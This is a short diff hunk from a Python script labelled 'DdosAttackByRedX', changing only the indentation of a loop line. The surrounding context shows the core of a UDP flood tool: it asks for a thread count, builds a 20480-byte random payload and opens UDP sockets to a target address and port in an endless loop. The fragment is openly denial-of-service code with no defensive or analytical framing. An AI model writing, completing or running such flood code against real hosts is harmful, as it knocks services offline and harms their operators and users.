@@ -34,7 +34,7 @@ threads = int(input("DdosAttackByRedX | Threads:"))
 def run():
         data = random._urandom(20480)
         i = random.choice(("[*]","[!]","[#]"))
-       while True:
+        while True:
                try:
                         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                         addr = (str(ip),int(port))
